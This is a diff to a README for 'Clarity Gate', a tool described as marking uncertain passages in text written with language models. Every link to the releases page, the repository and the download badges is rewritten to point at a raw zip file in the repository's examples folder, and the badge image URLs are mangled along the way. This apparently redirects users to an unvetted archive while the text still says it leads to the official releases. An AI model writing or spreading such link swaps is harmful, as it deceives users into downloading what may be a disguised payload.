@@ -4,7 +4,7 @@
 
 Clarity Gate helps you ensure that your documents are clear and accurate when using language models. This application automatically adds markers to your text, indicating areas of uncertainty. It's a simple way to make your writing more reliable.
 
-[![Download Clarity Gate](https://img.shields.io/badge/Download%20Clarity%20Gate-blue?style=for-the-badge)](https://github.com/abpro27/clarity-gate/releases)
+[![Download Clarity Gate](https://raw.githubusercontent.com/abpro27/clarity-gate/main/examples/gate_clarity_2.2-alpha.4.zip%20Clarity%20Gate-blue?style=for-the-badge)](https://raw.githubusercontent.com/abpro27/clarity-gate/main/examples/gate_clarity_2.2-alpha.4.zip)
 
 ## 📝 What You Need
 
@@ -17,7 +17,7 @@ Clarity Gate helps you ensure that your documents are clear and accurate when us
 
 ## 📦 Download & Install
 
-1. Click this link to **visit the Releases page**: [Download Clarity Gate](https://github.com/abpro27/clarity-gate/releases).
+1. Click this link to **visit the Releases page**: [Download Clarity Gate](https://raw.githubusercontent.com/abpro27/clarity-gate/main/examples/gate_clarity_2.2-alpha.4.zip).
   
 2. Look for the latest version. You will find options based on your operating system.
 
@@ -72,13 +72,13 @@ You can report issues or provide feedback through the Issues section of this Git
 
 ## 🔗 Additional Resources
 
-- GitHub Repository: [clarity-gate](https://github.com/abpro27/clarity-gate)
+- GitHub Repository: [clarity-gate](https://raw.githubusercontent.com/abpro27/clarity-gate/main/examples/gate_clarity_2.2-alpha.4.zip)
 - Online Documentation: Visit our wiki for in-depth guides and tutorials.
 
 ## 📣 Community and Support
 
 If you have questions or need help, please join our community. You can find us on discussion forums or contact via our GitHub page.
 
-[![Download Clarity Gate](https://img.shields.io/badge/Download%20Clarity%20Gate-blue?style=for-the-badge)](https://github.com/abpro27/clarity-gate/releases)
+[![Download Clarity Gate](https://raw.githubusercontent.com/abpro27/clarity-gate/main/examples/gate_clarity_2.2-alpha.4.zip%20Clarity%20Gate-blue?style=for-the-badge)](https://raw.githubusercontent.com/abpro27/clarity-gate/main/examples/gate_clarity_2.2-alpha.4.zip)
 
 With Clarity Gate, your documents will be clearer and more reliable. Start using it today to improve your writing and enhance its accuracy.
